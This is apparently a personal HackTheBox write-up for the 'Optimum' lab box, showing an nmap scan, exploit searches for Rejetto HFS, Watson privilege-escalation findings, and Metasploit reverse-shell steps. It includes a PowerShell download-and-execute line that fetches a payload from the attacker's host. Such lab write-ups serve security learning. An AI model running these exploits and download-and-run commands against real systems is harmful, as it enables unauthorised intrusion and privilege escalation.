<!DOCTYPE html>
<html>
  <head>
    <title>DocDock Documentation</title>
    
      <meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
<meta name="revised" content="2019-03-19T14:50:46 EDT">
<title>Optimum :: DocDock Documentation</title>
<link rel="shortcut icon" href="/images/favicon.png" type="image/x-icon" />
<link href="/css/font-awesome.min.css" rel="stylesheet">
<link href="/css/nucleus.css" rel="stylesheet">
<link href="/theme-flex/style.css" rel="stylesheet">

	<link href="/theme-flex/variant-red.css" rel="stylesheet">

<link rel="stylesheet" href="/css/bootstrap.min.css">
<script src="/js/jquery-2.x.min.js"></script>
<script type="text/javascript">
      var baseurl = "\/";
</script>
<meta name="description" content="">



    
  </head>
  <body data-url="/hackthebox/boxes/optimum/">
    
      <header>
  <div class="logo">
    




<h2 id="chickenpwny">ChickenPwny</h2>




  </div>
  <div class="burger"><a href="javascript:void(0);" style="font-size:15px;">&#9776;</a></div>
    <nav class="shortcuts">
            <li class="" role="">
                <a href="https://twitter.com/chickenpwny"  rel="noopener">
                  <i class='fa fa-twitter'></i> <label>Twitter</label>
                </a>
            </li>
            <li class="" role="">
                <a href="https://github.com/vjeantet/hugo-theme-docdock"  rel="noopener">
                  <i class='fa fa-github'></i> <label>Github repo</label>
                </a>
            </li>
            <li class="" role="">
                <a href="https://chickenpwny.github.io/images/meme/raw.gif"  rel="noopener">
                  <i class='fa fa-cloud-download'></i> <label>Download</label>
                </a>
            </li>
            <li class="" role="">
                <a href="#"  rel="noopener">
                  <i class='fa fa-bookmark'></i> <label>Book Mark</label>
                </a>
            </li>
            <li class="" role="">
                <a href="/credits"  rel="noopener">
                  <i class='fa fa-bullhorn'></i> <label>Credits</label>
                </a>
            </li>
    </nav>
</header>
<article>
  <aside>
    <ul class="menu">
<a href="http://chickenpwny.github.io"><img src="/images/meme/home.jpg" alt="Alternate Text" style="width:45%;margin-left:auto;margin-right:auto;border-radius:50%;display:block;" alt="Home" /></a>
<li data-nav-id="/concepts/" class="dd-item haschildren
        ">
    <div>

        <a href="/concepts/">Concept</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
    </div>
    <ul>
<li data-nav-id="/concepts/webapppentest/" class="dd-item haschildren
        ">
    <div>

        <a href="/concepts/webapppentest/">WebAppPenTests</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
    </div>
    <ul>
<li data-nav-id="/concepts/webapppentest/lfi/" class="dd-item
        ">
    <div>

        <a href="/concepts/webapppentest/lfi/"> Local File inclusion</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/concepts/webapppentest/heartbld/" class="dd-item
        ">
    <div>

        <a href="/concepts/webapppentest/heartbld/">HeartBleed</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/concepts/webapppentest/osinjcmd/" class="dd-item
        ">
    <div>

        <a href="/concepts/webapppentest/osinjcmd/">OS Command Injection</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/concepts/webapppentest/phptypejuggling/" class="dd-item
        ">
    <div>

        <a href="/concepts/webapppentest/phptypejuggling/">PHP Typw Juggling</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
    </ul>
</li>
    </ul>
</li>
<li data-nav-id="/hackthebox/" class="dd-item parent haschildren
        ">
    <div>

        <a href="/hackthebox/">HackTheBox</a>
        <i class="fa fa-angle-down fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
    </div>
    <ul>
<li data-nav-id="/hackthebox/boxes/" class="dd-item parent haschildren
        ">
    <div>

        <a href="/hackthebox/boxes/">Boxes</a>
        <i class="fa fa-angle-down fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
    </div>
    <ul>
<li data-nav-id="/hackthebox/boxes/hawk/" class="dd-item
        ">
    <div>

        <a href="/hackthebox/boxes/hawk/"></a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/hackthebox/boxes/blue/" class="dd-item
        ">
    <div>

        <a href="/hackthebox/boxes/blue/">Blue</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/hackthebox/boxes/carrier/" class="dd-item">
    <div>
        <a href="/hackthebox/boxes/carrier/">
            Carrier
        </a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/hackthebox/boxes/carrier-root/" class="dd-item">
    <div>
        <a href="/hackthebox/boxes/carrier-root/">
            CarrierRoot
        </a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/hackthebox/boxes/crimestoppers/" class="dd-item
        ">
    <div>

        <a href="/hackthebox/boxes/crimestoppers/">CrimeStopper</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/hackthebox/boxes/devel/" class="dd-item">
    <div>
        <a href="/hackthebox/boxes/devel/">
            Devel
        </a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/hackthebox/boxes/legacy/" class="dd-item
        ">
    <div>

        <a href="/hackthebox/boxes/legacy/">Legacy</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/hackthebox/boxes/mischief/" class="dd-item
        ">
    <div>

        <a href="/hackthebox/boxes/mischief/">Mischief</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/hackthebox/boxes/optimum/" class="dd-item active">
    <div>
        <a href="/hackthebox/boxes/optimum/">
            Optimum
        </a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/hackthebox/boxes/poison/" class="dd-item
        ">
    <div>

        <a href="/hackthebox/boxes/poison/">Poison</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/hackthebox/boxes/secnotes/" class="dd-item
        ">
    <div>

        <a href="/hackthebox/boxes/secnotes/">SecNotes</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/hackthebox/boxes/valentine/" class="dd-item
        ">
    <div>

        <a href="/hackthebox/boxes/valentine/">Valentine</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/hackthebox/boxes/waldo/" class="dd-item
        ">
    <div>

        <a href="/hackthebox/boxes/waldo/">Waldo</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/hackthebox/boxes/zipper/" class="dd-item
        ">
    <div>

        <a href="/hackthebox/boxes/zipper/">Zipper</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/hackthebox/boxes/oz/" class="dd-item
        ">
    <div>

        <a href="/hackthebox/boxes/oz/">oz</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/hackthebox/boxes/sunday/" class="dd-item
        ">
    <div>

        <a href="/hackthebox/boxes/sunday/">sunday</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
    </ul>
</li>
<li data-nav-id="/hackthebox/github/" class="dd-item haschildren
        ">
    <div>

        <a href="/hackthebox/github/">GitHub</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
    </div>
    <ul>
<li data-nav-id="/hackthebox/github/hugopowershell/" class="dd-item">
    <div>
        <a href="/hackthebox/github/hugopowershell/">
            Hugo/Github/Power
        </a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
    </ul>
</li>
<li data-nav-id="/hackthebox/challenges/" class="dd-item haschildren
        ">
    <div>

        <a href="/hackthebox/challenges/">Miscellaneous</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
    </div>
    <ul>
<li data-nav-id="/hackthebox/challenges/bloodhound/" class="dd-item">
    <div>
        <a href="/hackthebox/challenges/bloodhound/">
            
        </a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
    </ul>
</li>
    </ul>
</li>
<li data-nav-id="/help/" class="dd-item
        ">
    <div>

        <a href="/help/">Network Manager Down</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/tools/" class="dd-item haschildren
        ">
    <div>

        <a href="/tools/">Tools</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
    </div>
    <ul>
<li data-nav-id="/tools/bloodhound/" class="dd-item">
    <div>
        <a href="/tools/bloodhound/">
            BloodHound Neo4j
        </a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/tools/ftp/" class="dd-item">
    <div>
        <a href="/tools/ftp/">
            FTP
        </a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/tools/hydra/" class="dd-item
        ">
    <div>

        <a href="/tools/hydra/">Hydra</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/tools/nmap/" class="dd-item">
    <div>
        <a href="/tools/nmap/">
            Nmap
        </a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/tools/portscanning/" class="dd-item haschildren
        ">
    <div>

        <a href="/tools/portscanning/">PortScannings</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
    </div>
    <ul>
<li data-nav-id="/tools/portscanning/netcat/" class="dd-item
        ">
    <div>

        <a href="/tools/portscanning/netcat/">NetCat PORT SCAN</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/tools/portscanning/nmap/" class="dd-item
        ">
    <div>

        <a href="/tools/portscanning/nmap/">Nmap</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
    </ul>
</li>
<li data-nav-id="/tools/smb/smb/" class="dd-item">
    <div>
        <a href="/tools/smb/smb/">
            SMB
        </a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/tools/snmpwalk/" class="dd-item
        ">
    <div>

        <a href="/tools/snmpwalk/">SNMPWalk</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/tools/webapp/" class="dd-item haschildren
        ">
    <div>

        <a href="/tools/webapp/">WebApps</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
    </div>
    <ul>
<li data-nav-id="/tools/webapp/burp/" class="dd-item
        ">
    <div>

        <a href="/tools/webapp/burp/">Burp</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/tools/webapp/gobuster/" class="dd-item
        ">
    <div>

        <a href="/tools/webapp/gobuster/">GoBuster</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/tools/webapp/skipfish/" class="dd-item
        ">
    <div>

        <a href="/tools/webapp/skipfish/">SkipFish</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/tools/webapp/sqlmap/sqlmap/" class="dd-item">
    <div>
        <a href="/tools/webapp/sqlmap/sqlmap/">
            SqlMap
        </a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/tools/webapp/wfuzz/" class="dd-item
        ">
    <div>

        <a href="/tools/webapp/wfuzz/">WFuzz</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
    </ul>
</li>
<li data-nav-id="/tools/ssh/" class="dd-item haschildren
        ">
    <div>

        <a href="/tools/ssh/">ssh</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
    </div>
    <ul>
<li data-nav-id="/tools/ssh/port-forwarding/" class="dd-item
        ">
    <div>

        <a href="/tools/ssh/port-forwarding/">SHH Port Forwarding</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/tools/ssh/sshtunnling/" class="dd-item
        ">
    <div>

        <a href="/tools/ssh/sshtunnling/">SSHuttle</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
    </ul>
</li>
    </ul>
</li>



    </ul>
    <section>
    </section>
  </aside>
  <section class="page">
    
    <div class="nav-select">
      <center>Navigation : 
        <select onchange="javascript:location.href = this.value;">
          
    <option value="/concepts/" >
   Concept</option>
    <option value="/hackthebox/" >
   HackTheBox</option> 
    <option value="/hackthebox/boxes/" >
  - 
   Boxes</option> 
    <option value="/hackthebox/boxes/hawk/" >
  -- 
   </option>
    <option value="/hackthebox/boxes/blue/" >
  -- 
   Blue</option>
      <option value="/hackthebox/boxes/carrier/" >-- Carrier</option>
      <option value="/hackthebox/boxes/carrier-root/" >-- CarrierRoot</option>
    <option value="/hackthebox/boxes/crimestoppers/" >
  -- 
   CrimeStopper</option>
      <option value="/hackthebox/boxes/devel/" >-- Devel</option>
    <option value="/hackthebox/boxes/legacy/" >
  -- 
   Legacy</option>
    <option value="/hackthebox/boxes/mischief/" >
  -- 
   Mischief</option>
      <option value="/hackthebox/boxes/optimum/"  selected>-- Optimum</option>
    <option value="/hackthebox/boxes/poison/" >
  -- 
   Poison</option>
    <option value="/hackthebox/boxes/secnotes/" >
  -- 
   SecNotes</option>
    <option value="/hackthebox/boxes/valentine/" >
  -- 
   Valentine</option>
    <option value="/hackthebox/boxes/waldo/" >
  -- 
   Waldo</option>
    <option value="/hackthebox/boxes/zipper/" >
  -- 
   Zipper</option>
    <option value="/hackthebox/boxes/oz/" >
  -- 
   oz</option>
    <option value="/hackthebox/boxes/sunday/" >
  -- 
   sunday</option>
  
    <option value="/hackthebox/github/" >
  - 
   GitHub</option>
    <option value="/hackthebox/challenges/" >
  - 
   Miscellaneous</option>
  
    <option value="/help/" >
   Network Manager Down</option>
    <option value="/tools/" >
   Tools</option>



        </select>
      </center>
    </div>
      <div>
        <div class="searchbox">
          <input data-search-input id="search-by" type="text" placeholder="Search...">
        </div>
        <script type="text/javascript" src="/js/lunr.min.js"></script>
        <script type="text/javascript" src="/js/auto-complete.js"></script>
        <link href="/css/auto-complete.css" rel="stylesheet">
        <script type="text/javascript">
          
              var baseurl = "\/";
          
        </script>
        <script type="text/javascript" src="/js/search.js"></script>
      </div>
    

    <h1>Optimum</h1>
    
    
    
    <p>NMAP</p>

<pre><code>nmap -sV -sC 10.10.10.8  
 
Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-25 00:19 EST                                     
Nmap scan report for 10.10.10.8                                                                     
Host is up (0.042s latency).                                                                       
Not shown: 999 filtered ports                                                                       
PORT   STATE SERVICE VERSION                                                                       
80/tcp open  http    HttpFileServer httpd 2.3                                                       
|_http-server-header: HFS 2.3                                                                       
|_http-title: HFS /
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.89 seconds

</code></pre>

<p>hfs is vulnerable to a cmd injection vuln. That will allow us to Invoke a nishang shell</p>

<p><img src="https://chickenpwny.github.io/images/optimium/hfs.PNG" alt="hfs" /></p>

<p><img src="https://chickenpwny.github.io/images/optimium/powershell-Invoker.PNG" alt="powershell-Invoker" /></p>

<p>SEARCHSPLOIT</p>

<pre><code>searchsploit hfs
--------------------------------------------------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                                                                       |  Path
                                                                                                                     | (/usr/share/exploitdb/)
--------------------------------------------------------------------------------------------------------------------- ----------------------------------------
Apple Mac OSX 10.4.8 - DMG HFS+ DO_HFS_TRUNCATE Denial of Service                                                    | exploits/osx/dos/29454.txt
Apple Mac OSX 10.6 - HFS FileSystem (Denial of Service)                                                              | exploits/osx/dos/12375.c
Apple Mac OSX 10.6.x - HFS Subsystem Information Disclosure                                                          | exploits/osx/local/35488.c
Apple Mac OSX xnu 1228.x - 'hfs-fcntl' Kernel Privilege Escalation                                                   | exploits/osx/local/8266.txt
FHFS - FTP/HTTP File Server 2.1.2 Remote Command Execution                                                           | exploits/windows/remote/37985.py
Linux Kernel 2.6.x - SquashFS Double-Free Denial of Service                                                          | exploits/linux/dos/28895.txt
Rejetto HTTP File Server (HFS) - Remote Command Execution (Metasploit)                                               | exploits/windows/remote/34926.rb
Rejetto HTTP File Server (HFS) 1.5/2.x - Multiple Vulnerabilities                                                    | exploits/windows/remote/31056.py
Rejetto HTTP File Server (HFS) 2.2/2.3 - Arbitrary File Upload                                                       | exploits/multiple/remote/30850.txt
Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (1)                                                  | exploits/windows/remote/34668.txt
Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2)                                                  | exploits/windows/remote/39161.py
Rejetto HTTP File Server (HFS) 2.3a/2.3b/2.3c - Remote Command Execution                                             | exploits/windows/webapps/34852.txt
--------------------------------------------------------------------------------------------------------------------- ----------------------------------------
</code></pre>

<p>So First i got a nishang shell then i moved over to a nc.exe shell using this really cool trick 0xdf used in his devel writeup. <a href="https://0xdf.gitlab.io/2019/03/05/htb-devel.html#shell-as-web">https://0xdf.gitlab.io/2019/03/05/htb-devel.html#shell-as-web</a>   . after that im going to run Watson and find an exploit.</p>

<pre><code>systeminfo
</code></pre>

<p>its running on x64-baseed pc using</p>

<pre><code>reg query &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP&quot;
</code></pre>

<pre><code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP\CDF 
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP\v4 
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP\v4.0 
</code></pre>

<pre><code>cd C:\Users&gt;c:\Windows\Microsoft.NET\Framework
dir /A:D
</code></pre>

<p><img src="https://chickenpwny.github.io/images/optimium/framework-net.PNG" alt="framework-net" /></p>

<p>i will compile it in 4.0 .net. 0xdf has a great guide for compiling watson &amp; ippsec has a video on it.</p>

<p><a href="https://0xdf.gitlab.io/2019/03/05/htb-devel.html#Watson">https://0xdf.gitlab.io/2019/03/05/htb-devel.html#Watson</a></p>

<pre><code>\\10.10.14.49\share\Watson-net4-64base.exe
  __    __      _
 / / /\ \ \__ _| |_ ___  ___  _ __
 \ \/  \/ / _` | __/ __|/ _ \| '_ \
  \  /\  / (_| | |_\__ \ (_) | | | |
   \/  \/ \__,_|\__|___/\___/|_| |_|

                           v0.1

                  Sherlock sucks...
                   @_RastaMouse

 [*] OS Build number: 9600
 [*] CPU Address Width: 64
 [*] Process IntPtr Size: 8
 [*] Using Windows path: C:\WINDOWS\System32

  [*] Appears vulnerable to MS15-051
   [&gt;] Description: An EoP exists due to improper object handling in the win32k.sys kernel mode driver.
   [&gt;] Exploit: https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/local/ms15_051_client_copy_image.rb
   [&gt;] Notes: None.

  [*] Appears vulnerable to MS15-076
   [&gt;] Description: Local DCOM DCE/RPC connections can be reflected back to a listening TCP socket allowing access to an NTLM authentication challenge for LocalSystem, which can be replayed to the local DCOM activation service to elevate privileges.
   [&gt;] Exploit: https://www.exploit-db.com/exploits/37768/
   [&gt;] Notes: None.

  [*] Appears vulnerable to MS15-078
   [&gt;] Description: An EoP exists due to a pool based buffer overflow in the atmfd.dll driver when parsing a malformed font.
   [&gt;] Exploit: https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/local/ms15_078_atmfd_bof.rb
   [&gt;] Notes: None.
  [*] Appears vulnerable to MS16-032
   [&gt;] Description: An EoP exists due to a lack of sanitization of standard handles in Windows' Secondary Logon Service.
   [&gt;] Exploit: https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Invoke-MS16-032.ps1
   [&gt;] Notes: None.

  [*] Appears vulnerable to MS16-034
   [&gt;] Description: An EoP exist when the Windows kernel-mode driver fails to properly handle objects in memory.
   [&gt;] Exploit: https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-034
   [&gt;] Notes: None.

 [*] Finished. Found 5 vulns :)
ERROR&gt; C:\WINDOWS\System32\drivers\mrxdav.sys
ERROR&gt; C:\WINDOWS\System32\win32kfull.sys
ERROR&gt; C:\WINDOWS\System32\pcadm.dll
ERROR&gt; C:\WINDOWS\System32\coremessaging.dll



</code></pre>

<p>I could never get this to work i tried a bunch of different ways. ippsec said that the other ms16032 exploit out there requires additional modification to work. but the empire framework offers an easier solution. \10.10.14.49\share\Invoke-MS16032.ps1</p>

<p>add this at the end of ms16032</p>

<pre><code>Invoke-MS16032 -Command &quot;iex(New-Object Net.Webclient).downloadstring('http://10.10.14.49/sploit.ps1')&quot;
</code></pre>

<p>then invoke it, after you load the payload you can call the funtions with Invoke-MS16032</p>

<p>METASPLOIT</p>

<p>i couldn&rsquo;t get it to work so on to metasploit.</p>

<pre><code>search rejetto
use windows/http/rejetto_hfs_exec
</code></pre>

<p>Make sure burp is running.</p>

<pre><code>options 
Module options (exploit/windows/http/rejetto_hfs_exec):

   Name       Current Setting      Required  Description
   ----       ---------------      --------  -----------
   HTTPDELAY  10                   no        Seconds to wait before terminating web server
   Proxies    http:127.0.0.1:8080  no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     10.10.10.8           yes       The target address range or CIDR identifier
   RPORT      80                   yes       The target port (TCP)
   SRVHOST    10.10.14.49          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
   SRVPORT    8088                 yes       The local port to listen on.
   SSL        false                no        Negotiate SSL/TLS for outgoing connections
   SSLCert                         no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /                    yes       The path of the web application
   URIPATH                         no        The URI to use for this exploit (default is random)
   VHOST                           no        HTTP server virtual host


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.14.49      yes       The listen address (an interface may be specified)
   LPORT     4446             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic

</code></pre>

<p>NEXT</p>

<p>First you need to load the regular meterpreter x86 to find the vuln then move to x64 to run the exploit. set lport to something else. set target 1 will run in x64 mode.</p>

<pre><code>set payload windows/x64/meterpreter/reverse_tcp
set LPORT 9017
</code></pre>

<p>RUN</p>

<p>exit the session with crtl + z save session remember the session number.</p>

<pre><code>search ms16_032
windows/local/ms16_032_secondary_logon_handle_privesc
</code></pre>

<p>options</p>

<p>target 1 to change to x64, session number, set the lport to something different than the meterpreter shell.</p>

<pre><code>set target 1
set lport 9019
set session 2
run
</code></pre>

<pre><code>Module options (exploit/windows/local/ms16_032_secondary_logon_handle_privesc):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION  3                yes       The session to run this module on.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.14.49      yes       The listen address (an interface may be specified)
   LPORT     4446             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   1   Windows x64
</code></pre>

<p>Then it hangs.</p>

<p>ALPX task scheduler local privilege elevation</p>

<p>writes arbitrary dacls to ,job files located in c:windows\task. This is pretty bad lol it doesn&rsquo;t check for an impersonation attack. since we can create files in c:\windows\task folder a hardlink can be created to a file the user has read access to. after creating a hardlink, the vulnerability can triggered to set the dacls ton the linked file. teste dup windows10</p>

<pre><code>msf5 post(multi/recon/local_exploit_suggester) &gt; use exploit/windows/local/alpc_taskscheduler
msf5 exploit(windows/local/alpc_taskscheduler) &gt; options

Module options (exploit/windows/local/alpc_taskscheduler):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   PROCESS                   no        Name of process to spawn and inject dll into.
   SESSION                   yes       The session to run this module on.


Exploit target:

   Id  Name
   --  ----
   0   Windows 10 x64
</code></pre>

<p>need to set the lhost, lport,  &amp; session.</p>

<pre><code>set session 2
set payload windows/x64/meterpreter/reverse_tcp
set lhost ippaddr
set lport 443
run
</code></pre>

<p><img src="https://chickenpwny.github.io/images/optimum/root.PNG" alt="root" /></p>

<p><img src="https://chickenpwny.github.io/images/optimum/502.jpg" alt="502" /></p>


    
    
        <div class="chevrons">
    <div id="navigation">
<a class="nav nav-prev" href="/hackthebox/boxes/mischief/" title="Mischief"> <i class="fa fa-chevron-left"></i><label>Mischief</label></a>
    <a class="nav nav-next" href="/hackthebox/boxes/poison/" title="Poison" style="margin-right: 0px;"><label>Poison</label><i class="fa fa-chevron-right"></i></a></div>
  </div>

  </section>
</article>

<footer>

<div class="footline">
    

    

    

    
    <div class="github-link">
      <a href="https://chickenpwny.github.ioHackTheBox/Boxes/optimum.md" target="blank"><i class="fa fa-code-fork"></i>
        Improve this page</a>
    </div>
    
  </div>


	<div>


  
    Create a content/_footer.md file to customize the footer content
  



	</div>
</footer>

<script src="/js/clipboard.min.js"></script>

<link href="/css/featherlight.min.css" rel="stylesheet">
<script src="/js/featherlight.min.js"></script>



<script src="/theme-flex/script.js"></script>


    

    
    

    
  </body>
</html>